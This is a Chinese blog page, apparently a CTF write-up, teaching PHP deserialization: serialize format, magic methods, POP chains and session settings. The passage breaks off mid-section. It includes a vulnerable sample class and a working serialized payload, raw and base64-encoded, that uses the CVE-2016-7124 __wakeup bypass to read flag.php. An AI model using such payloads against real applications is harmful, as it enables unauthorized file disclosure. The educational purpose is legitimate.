<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="AMao"><meta name="renderer" content="webkit"><meta name="copyright" content="AMao"><meta name="keywords" content="AMao's Blog"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>2019湖湘杯WP-Web · AMao's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">AMao</div><div class="profile-signature">小菜鸡目前对一些东西的认知，希望师傅们可以帮忙纠正！</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">AMao's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">2019湖湘杯WP-Web</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2020-05-10</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" target="_blank" rel="noopener" date-tags="PHP,Web安全，CTF"> PHP,Web安全，CTF</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">6.8k</span> | Reading time: <span class="post-count">29</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="POP-面向属性编程（Property-Oriented-Programing）"><a href="#POP-面向属性编程（Property-Oriented-Programing）" class="headerlink" title="POP  面向属性编程（Property-Oriented Programing）"></a>POP  面向属性编程（Property-Oriented Programing）</h2><p>  常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p>
<p>  在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p>
<ul>
<li><p>类</p>
<p>类成员包括由属性和方法构成，类属性存在于数据段，类方法存在于代码段，对于一个类来说，类的方法不占用类的空间，占空间的只有类的属性 </p>
</li>
</ul>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>  所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示 </p>
<ul>
<li>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 </li>
<li>成员变量若是 private 属性，它会在两侧加入空字节 ，长度 +2</li>
<li>如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数<code>spl_autoload_register()</code>来实现。</li>
</ul>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>  为了能够unserialize()一个对象，这个对象的类必须已经定义过 </p>
<ul>
<li>反序列化可以控制类属性，无论是private还是public </li>
</ul>
<ul>
<li><p>发序列化的危害</p>
<p>序列化操作只是保存对象(不是类)的变量，不保存对象的方法，因此其实反序列化的主要危害在于我们可以控制对象的变量来改变程序执行流程从而达到我们最终的目的 </p>
</li>
<li><p>序列化机制的作用</p>
<p>在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。</p>
<p>如果一个脚本中想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容释放掉了，我们要如何操作呢？难道要前一个脚本不断的循环，等待后面脚本的调用？这肯定是不现实的。</p>
<p> serialize和unserialize就是解决这一问题的存在，serialize可以将变量转换为字符串，并且在转换中可以保存当前变量的值；而unserialize则可以将serialize生成的字符串变换回变量。</p>
</li>
<li><p>序列化示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">	public $name=&apos;&apos;;</span><br><span class="line">	public $age=0;</span><br><span class="line">	public function printData()</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;$this-&gt;name is $this-&gt;age old!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = new User();</span><br><span class="line">$user-&gt;name = &apos;Jhon&apos;;</span><br><span class="line">$user-&gt;age = 20;</span><br><span class="line">echo serialize($user);</span><br><span class="line">$userString = &apos;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;Jhon&quot;;s:3:&quot;age&quot;;i:20;&#125;&apos;;</span><br><span class="line">$userObject = unserialize($userString); </span><br><span class="line">$userObject-&gt;printData();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>第一个 <code>echo</code> 输出 <code>O:4:&quot;User&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;Jhon&quot;;s:3:&quot;age&quot;;i:20;}</code></p>
<ul>
<li>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:4:”John”;} 就是对象user序列化之后的形式</li>
<li>O表示是对象，4 表示 对象名长度为4，user为对象名</li>
<li>2表示有两个参数，{} 里面是参数的key和value</li>
<li>S 表示是string对象，3 表示长度，age是key</li>
<li>i 表示是integer对象，20是value</li>
</ul>
<table>
<thead>
<tr>
<th align="center">a</th>
<th align="center">array 数组</th>
</tr>
</thead>
<tbody><tr>
<td align="center">b</td>
<td align="center">boolean布尔型</td>
</tr>
<tr>
<td align="center">d</td>
<td align="center">double双精度型</td>
</tr>
<tr>
<td align="center">i</td>
<td align="center">integer</td>
</tr>
<tr>
<td align="center">o</td>
<td align="center">common object一般对象</td>
</tr>
<tr>
<td align="center">r</td>
<td align="center">reference</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">string</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">custom object 自定义对象</td>
</tr>
<tr>
<td align="center">O</td>
<td align="center">class</td>
</tr>
<tr>
<td align="center">N</td>
<td align="center">null</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>  系统自带的方法名，均以双下划线开头 ，在特定的情况下会被调用 </p>
<p>  我们无法控制对象的方法来调用，因此我们这里只能去找一些可以自动调用的一些魔术方法</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__construct() 	 //构造函数</span><br><span class="line">__destruct() 	//对象被销毁时触发，析构函数</span><br><span class="line">__wakeup()		//unserialize() 恢复对象时</span><br><span class="line">__sleep()		 //使用serialize时触发</span><br><span class="line">__call() 		//在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic()	 //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get()			 //用于从不可访问的属性读取数据</span><br><span class="line">__set() 		//用于将数据写入不可访问的属性</span><br><span class="line">__isset() 		//在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() 		//在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString()	 //把类当作字符串使用时触发</span><br><span class="line">__invoke() 		//当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>__sleep()</code></p>
<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。</p>
<p>如果存在，该方法会先被调用，然后才执行序列化操作。</p>
<p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p>
<p>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
<p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。  </p>
</li>
<li><p><code>__wakeup()</code></p>
<p>unserialize() 会检查是否存在一个 <code>__wakeup()</code> 方法。</p>
<p>如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源 </p>
<p> 预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。 </p>
<ul>
<li><p>代码示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Caiji&#123;</span><br><span class="line">    public function __construct($ID, $sex, $age)&#123;</span><br><span class="line">        $this-&gt;ID = $ID;</span><br><span class="line">        $this-&gt;sex = $sex;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">        $this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        echo $this-&gt;info . &apos;&lt;br&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * serialize前调用 用于删选需要被序列化存储的成员变量</span><br><span class="line">     * @return array [description]</span><br><span class="line">     */</span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        echo __METHOD__ . &apos;&lt;br&gt;&apos;;</span><br><span class="line">        return [&apos;ID&apos;, &apos;sex&apos;, &apos;age&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * unserialize前调用 用于预先准备对象资源</span><br><span class="line">     */</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo __METHOD__ . &apos;&lt;br&gt;&apos;;</span><br><span class="line">        $this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = new Caiji(&apos;twosmi1e&apos;, 20, &apos;male&apos;);</span><br><span class="line"></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line">//存在__sleep()函数，$info属性不会被存储</span><br><span class="line">$temp = serialize($me);</span><br><span class="line">echo $temp . &apos;&lt;br&gt;&apos;;</span><br><span class="line">	</span><br><span class="line">$me = unserialize($temp);</span><br><span class="line">//__wakeup()组装的$info</span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ID: twosmi1e, age: 20, sex: male</span><br><span class="line">Caiji::__sleep</span><br><span class="line">O:5:&quot;Caiji&quot;:3:&#123;s:2:&quot;ID&quot;;s:8:&quot;twosmi1e&quot;;s:3:&quot;sex&quot;;i:20;s:3:&quot;age&quot;;s:4:&quot;male&quot;;&#125;</span><br><span class="line">Caiji::__wakeup</span><br><span class="line">ID: twosmi1e, age: 20, sex: male</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><code>__toString()</code></p>
<p>把类当作字符串使用时触发</p>
<p>如  <code>echo $obj;</code> 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 </p>
<ul>
<li><p>示例代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Caiji&#123;</span><br><span class="line">    public function __construct($ID, $sex, $age)&#123;</span><br><span class="line">        $this-&gt;ID = $ID;</span><br><span class="line">        $this-&gt;sex = $sex;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">        $this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = new Caiji(&apos;twosmi1e&apos;, 20, &apos;male&apos;);</span><br><span class="line">echo &apos;__toString:&apos; . $me . &apos;&lt;br&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行结果</p>
<p><code>__toString:ID: twosmi1e, age: 20, sex: male</code></p>
<p>如果不编写 <code>__toString()</code> 函数，则报错：<code>Catchable fatal error: Object of class Caiji could not be converted to string</code></p>
</li>
</ul>
</li>
</ul>
<h1 id="反序列化对象注入"><a href="#反序列化对象注入" class="headerlink" title="反序列化对象注入"></a>反序列化对象注入</h1><h2 id="绕过-wakeup-方法"><a href="#绕过-wakeup-方法" class="headerlink" title="绕过 __wakeup() 方法"></a>绕过 <code>__wakeup()</code> 方法</h2><p>  在 PHP 5.3.29 实验成功</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class SoFun&#123; </span><br><span class="line">  protected $file=&apos;index.php&apos;;</span><br><span class="line">  function __destruct()&#123; </span><br><span class="line">    if(!empty($this-&gt;file)) &#123;</span><br><span class="line">      if(strchr($this-&gt; file,&quot;\\&quot;)===false &amp;&amp;  strchr($this-&gt;file, &apos;/&apos;)===false)</span><br><span class="line">        show_source(dirname (__FILE__).&apos;/&apos;.$this -&gt;file);</span><br><span class="line">      else</span><br><span class="line">        die(&apos;Wrong filename.&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  function __wakeup()&#123;</span><br><span class="line">   $this-&gt; file=&apos;index.php&apos;;</span><br><span class="line">  &#125; </span><br><span class="line">  public function __toString()</span><br><span class="line">  &#123;</span><br><span class="line">    return &apos;&apos; ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     </span><br><span class="line">if (!isset($_GET[&apos;file&apos;]))&#123; </span><br><span class="line">  show_source(&apos;index.php&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">  $file=base64_decode($_GET[&apos;file&apos;]); 	//base64 解码</span><br><span class="line">  echo unserialize($file); </span><br><span class="line">&#125;</span><br><span class="line"> ?&gt; #&lt;!--key in flag.php--&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>分析一下源码，<code>__destruct</code> 方法中 <code>show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);</code> 会读取file文件内容，我们需要利用这里来读flag.php，思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，但是<code>__wakeup</code>会在unserialize之前执行，所以要绕过这一点。 </p>
</li>
<li><p><code>CVE-2016-7124</code></p>
<p>当序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过 <code>__wakeup()</code> 的执行</p>
</li>
<li><p>构造 payload</p>
<ul>
<li><p>构造序列化对象<br><code>O:5:&quot;SoFun&quot;:1:{S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
</li>
<li><p>绕过 <code>__wakeup()</code><br><code>O:5:&quot;SoFun&quot;:2:{S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
</li>
<li><p>TIPS</p>
<p>注意：因为file是protect属性，所以需要加上 <code>\00*\00</code></p>
</li>
<li><p>base64 编码</p>
<p>payload：<code>Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</code></p>
</li>
</ul>
</li>
</ul>
<h1 id="session-反序列化漏洞"><a href="#session-反序列化漏洞" class="headerlink" title="session 反序列化漏洞"></a>session 反序列化漏洞</h1><h2 id="PHP-session"><a href="#PHP-session" class="headerlink" title="PHP session"></a>PHP session</h2><ul>
<li><p>简介</p>
<p><code>PHP session</code>可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是， <code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 <code>session</code> 值会存储于服务器端，这也是与 <code>cookie</code>的主要区别，所以 <code>seesion</code> 的安全性相对较高。 </p>
<p>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化 </p>
</li>
</ul>
<h2 id="PHP-Session-工作流程"><a href="#PHP-Session-工作流程" class="headerlink" title="PHP Session 工作流程"></a>PHP Session 工作流程</h2><ul>
<li><p>当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 <code>cookie</code> ），如果发现请求的 <code>Cookies</code> 、 <code>Get</code> 、 <code>Pos</code> t中不存在 <code>session id</code> ，PHP 就会自动调用 <code>php_session_create_id</code> 函数创建一个新的会话，并且在 <code>http response</code> 中通过 <code>set-cookie</code> 头部发送给客户端保存 </p>
</li>
<li><p>有时候浏览器用户设置会禁止 <code>cookie</code> ，当在客户端 <code>cookie</code> 被禁用的情况下，php也可以自动将 <code>session id</code> 添加到url参数中以及 <code>form</code> 的 <code>hidden</code>字段中，但这需要将 <code>php.ini</code> 中的 <code>session.use_trans_sid</code> 设为开启，也可以在运行时调用 <code>ini_set</code> 来设置这个配置项 </p>
</li>
<li><p>会话开始之后，PHP 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中</p>
<p>在session 变量中注册变量： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;username&apos;])) </span><br><span class="line">&#123;  </span><br><span class="line">	$_SESSION[&apos;username&apos;] = &apos;xianzhi&apos; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行 序列化 ， 然后发送给会话保存管理器来进行保存</p>
</li>
<li><p>默认情况下，PHP 使用内置的文件会话保存管理器来完成 <code>session</code> 的保存，也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项 <code>session.save_path</code> 所指定的位置。 </p>
</li>
</ul>
<ul>
<li><p><code>php.ini</code>  中的配置，可以在 <code>phpinfo.php</code> 中查看</p>
<ul>
<li><p><code>session.save_path</code> </p>
<p>设置session的存储路径</p>
</li>
<li><p><code>session.save_handler</code> </p>
<p>设定用户自定义存储函数，若想使用PHP内置 <code>session</code> 存储机制之外的可以使用这个函数</p>
</li>
<li><p><code>session.auto_start</code> </p>
<p>指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</p>
</li>
<li><p><code>session.serialize_handler</code> </p>
<p>定义用来序列化/反序列化的处理器名字，默认使用php </p>
<ul>
<li><p>除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同 </p>
<ul>
<li><p>php_binary </p>
<p>键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</p>
</li>
<li><p>php</p>
<p>键名＋竖线＋经过serialize()函数反序列处理的值</p>
</li>
<li><p>php_serialize </p>
<p>serialize()函数反序列处理数组</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p><code>session.gc_divisor</code></p>
<p>php session垃圾回收机制相关配置</p>
</li>
<li><p><code>session.sid_bits_per_character</code></p>
<p>指定编码的会话ID字符中的位数</p>
</li>
<li><p><code>session.use_strict_mode</code></p>
<p>严格会话模式，严格会话模式不接受未初始化的会话ID并重新生成会话ID</p>
</li>
<li><p>session.use_cookies</p>
<p>指定是否在客户端用 cookie 来存放会话 ID，默认启用</p>
</li>
<li><p>session.cookie_secure</p>
<p>指定是否仅通过安全连接发送 <code>cookie</code> ，默认关闭</p>
</li>
<li><p>session.use_only_cookies</p>
<p>指定是否在客户端 <em>仅仅</em> 使用 <code>cookie</code> 来存放会话 ID，启用的话，可以防止有关通过 URL 传递会话 ID 的攻击</p>
</li>
<li><p>session.name</p>
<p>指定会话名以用做 <code>cookie</code> 的名字，只能由字母数字组成，默认为 <code>PHPSESSID</code></p>
</li>
<li><p>session.cookie_lifetime</p>
<p>指定了发送到浏览器的 cookie 的生命周期，单位为秒，值为 0 表示“直到关闭浏览器”。默认为 <em>0</em></p>
</li>
<li><p>session.cookie_path</p>
<p>指定要设置会话 <code>cookie</code> 的路径，默认为 <em>/</em></p>
</li>
<li><p>session.cookie_domain</p>
<p>指定要设置会话 <code>cookie</code> 的域名，默认为无，表示根据 <code>cookie</code> 规范产生 <code>cookie</code> 的主机名</p>
</li>
<li><p>session.cookie_httponly</p>
<p>将Cookie标记为只能通过HTTP协议访问，即无法通过脚本语言（例如JavaScript）访问Cookie，此设置可以有效地帮助通过XSS攻击减少身份盗用</p>
</li>
<li><p>session.gc_probability</p>
<p>该配置项与 <code>session.gc_divisor</code> 合起来用来管理 <code>garbage collection</code> ，即垃圾回收进程启动的概率</p>
</li>
<li><p>session.gc_divisor</p>
<p>该配置项与 <code>session.gc_probability</code> 合起来定义了在每个会话初始化时启动垃圾回收进程的概率</p>
</li>
<li><p>session.gc_maxlifetime</p>
<p>指定过了多少秒之后数据就会被视为“垃圾”并被清除，垃圾搜集可能会在 <code>session</code> 启动的时候开始（ 取决于 <code>session.gc_probability</code> 和 <code>session.gc_divisor</code> ）</p>
</li>
<li><p>session.referer_check</p>
<p>包含有用来检查每个 <code>HTTP Referer</code>的子串。如果客户端发送了 <code>Referer</code> 信息但是在其中并未找到该子串，则嵌入的会话 ID 会被标记为无效。默认为空字符串</p>
</li>
<li><p>session.cache_limiter</p>
<p>指定会话页面所使用的缓冲控制方法（ <code>none/nocache/private/private_no_expire/public</code> ）。默认为 <code>nocache</code></p>
</li>
<li><p>session.cache_expire</p>
<p>以分钟数指定缓冲的会话页面的存活期，此设定对 <code>nocache</code> 缓冲控制方法无效。默认为 180</p>
</li>
<li><p>session.use_trans_sid</p>
<p>指定是否启用透明 SID 支持。默认禁用</p>
</li>
<li><p>session.sid_length</p>
<p>配置会话ID字符串的长度。 会话ID的长度可以在22到256之间。默认值为32。</p>
</li>
<li><p>session.trans_sid_tags</p>
<p>指定启用透明sid支持时重写哪些HTML标签以包括会话ID</p>
</li>
<li><p>session.trans_sid_hosts</p>
<p>指定启用透明sid支持时重写的主机，以包括会话ID</p>
</li>
<li><p>session.sid_bits_per_character</p>
<p>配置编码的会话ID字符中的位数</p>
</li>
<li><p>session.upload_progress.enabled</p>
<p>启用上传进度跟踪，并填充 <code>$ _SESSION</code> 变量， 默认启用。</p>
</li>
<li><p>session.upload_progress.cleanup</p>
<p>读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</p>
</li>
<li><p>session.upload_progress.prefix</p>
<p>配置 <code>$ _SESSION</code> 中用于上传进度键的前缀，默认为 <code>upload_progress_</code></p>
</li>
<li><p>session.upload_progress.name</p>
<p><code>$ _SESSION</code> 中用于存储进度信息的键的名称，默认为 <code>PHP_SESSION_UPLOAD_PROGRESS</code></p>
</li>
<li><p>session.upload_progress.freq</p>
<p>定义应该多长时间更新一次上传进度信息</p>
</li>
<li><p>session.upload_progress.min_freq</p>
<p>更新之间的最小延迟</p>
</li>
<li><p>session.lazy_write</p>
<p>配置会话数据在更改时是否被重写，默认启用</p>
<p>以上配置项涉及到的安全比较多，如会话劫持、XSS、CSRF 等</p>
</li>
</ul>
</li>
<li><p>存储机制</p>
